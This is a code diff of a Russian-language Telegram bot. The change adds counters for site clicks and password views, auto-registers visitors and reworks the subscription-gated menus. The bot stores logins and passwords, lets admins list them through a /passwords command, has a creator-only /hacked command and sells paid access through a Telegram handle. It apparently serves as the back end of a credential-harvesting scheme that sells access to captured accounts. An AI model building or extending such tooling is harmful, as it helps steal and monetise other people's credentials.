@@ -104,21 +104,53 @@ def get_user(chat_id):
         conn.close()
         return None
 
-def save_user(chat_id, prefix, subscription_end):
+def save_user(chat_id, prefix, subscription_end=None):
     conn = get_db_connection()
     if conn is None:
         print(f"Не удалось сохранить пользователя {chat_id}: нет подключения к БД")
         return
     try:
         c = conn.cursor()
+        if subscription_end is None:
+            subscription_end = datetime.now().isoformat()
         c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                   "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
-                  (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
+                  (chat_id, prefix, subscription_end, prefix, subscription_end))
         conn.commit()
         conn.close()
         print(f"Пользователь {chat_id} сохранен с префиксом {prefix}")
     except Exception as e:
         print(f"Ошибка сохранения пользователя {chat_id}: {e}")
+        conn.close()
+
+def increment_site_clicks(chat_id):
+    conn = get_db_connection()
+    if conn is None:
+        print(f"Не удалось обновить клики для {chat_id}: нет подключения к БД")
+        return
+    try:
+        c = conn.cursor()
+        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
+        conn.commit()
+        conn.close()
+        print(f"Клики на сайт увеличены для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка увеличения кликов для {chat_id}: {e}")
+        conn.close()
+
+def increment_password_views(chat_id):
+    conn = get_db_connection()
+    if conn is None:
+        print(f"Не удалось обновить просмотры паролей для {chat_id}: нет подключения к БД")
+        return
+    try:
+        c = conn.cursor()
+        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
+        conn.commit()
+        conn.close()
+        print(f"Просмотры паролей увеличены для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка увеличения просмотров паролей для {chat_id}: {e}")
         conn.close()
 
 def save_credentials(login, password):
@@ -267,16 +299,22 @@ def get_all_users():
 def check_access(chat_id, command):
     global tech_break
     print(f"Проверка доступа для {chat_id} на команду {command}")
+    user = get_user(chat_id)
+    if user is None and command in ['start', 'menu', 'getchatid']:
+        save_user(chat_id, "Посетитель")
+        user = get_user(chat_id)
+    
     if tech_break and chat_id != ADMIN_CHAT_ID:
         time_left = (tech_break - datetime.now()).total_seconds() / 60
         if time_left > 0:
             return f"⏳ Сейчас идет техперерыв. Окончание через {int(time_left)} минут."
-    user = get_user(chat_id)
     if not user or user['prefix'] == 'Посетитель':
-        return "🔒 Вы можете купить подписку у @sacoectasy."
+        if command in ['start', 'menu', 'getchatid']:
+            return None
+        return "🔒 Вы можете купить подписку у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
     if user['subscription_end'] and user['subscription_end'] < datetime.now():
         save_user(chat_id, 'Посетитель', datetime.now())
-        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy."
+        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
     if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
         return "🔒 Доступно только для Админа и Создателя!"
     if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
@@ -380,29 +418,19 @@ def menu_cmd(message):
                 tech_break = None
                 print("Техперерыв истек, сбрасываем на None")
         
-        response += "\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop\n/techstopoff"
-        if user['prefix'] in ['Админ', 'Создатель']:
-            response += "\n/passwords\n/admin"
-        if user['prefix'] == 'Создатель':
-            response += "\n/hacked\n/database\n/adprefix\n/delprefix"
+        response += "\n\n🧾 Команды:\n/start\n/menu\n/getchatid"
+        if user['prefix'] != 'Посетитель':
+            response += "\n/site\n/techstop\n/techstopoff"
+            if user['prefix'] in ['Админ', 'Создатель']:
+                response += "\n/passwords\n/admin"
+            if user['prefix'] == 'Создатель':
+                response += "\n/hacked\n/database\n/adprefix\n/delprefix"
     else:
-        response = "🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
+        response = "🧾 Команды:\n/start\n/menu\n/getchatid"
         print(f"Пользователь для {chat_id} не найден, показываем базовое меню")
     
     print(f"Отправляем ответ для {chat_id}: {response}")
     bot.reply_to(message, response)
-
-@bot.message_handler(commands=['site'])
-def site_cmd(message):
-    chat_id = str(message.chat.id)
-    print(f"Обработка /site для chat_id: {chat_id}")
-    access = check_access(chat_id, 'site')
-    if access:
-        bot.reply_to(message, access)
-        return
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
-    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)
 
 @bot.message_handler(commands=['getchatid'])
 def getchatid_cmd(message):
@@ -412,7 +440,24 @@ def getchatid_cmd(message):
     if access:
         bot.reply_to(message, access)
         return
-    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")
+    user = get_user(chat_id)
+    if user['prefix'] == 'Посетитель':
+        bot.reply_to(message, f"👤 Здесь можете посмотреть свой ID: {chat_id}")
+    else:
+        bot.reply_to(message, f"👤 Ваш Chat ID: {chat_id}")
+
+@bot.message_handler(commands=['site'])
+def site_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Обработка /site для chat_id: {chat_id}")
+    access = check_access(chat_id, 'site')
+    if access:
+        bot.reply_to(message, access)
+        return
+    increment_site_clicks(chat_id)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
+    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)
 
 @bot.message_handler(commands=['techstop'])
 def techstop_cmd(message):
@@ -451,6 +496,7 @@ def passwords_cmd(message):
     if access:
         bot.reply_to(message, access)
         return
+    increment_password_views(chat_id)
     credentials = get_credentials()
     if not credentials:
         bot.reply_to(message, "📂 Список паролей пуст.")
@@ -730,8 +776,8 @@ def admin_cmd(message):
         response += (f"Chat ID: {chat_id}\n"
                      f"Префикс: {prefix}\n"
                      f"Подписка: {time_left} дней\n"
-                     f"Кликов на сайт: {site_clicks}\n"
-                     f"Просмотров паролей: {password_views}\n\n")
+                     f"Кликов на сайт: {site_clicks if site_clicks else 0}\n"
+                     f"Просмотров паролей: {password_views if password_views else 0}\n\n")
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['adprefix'])
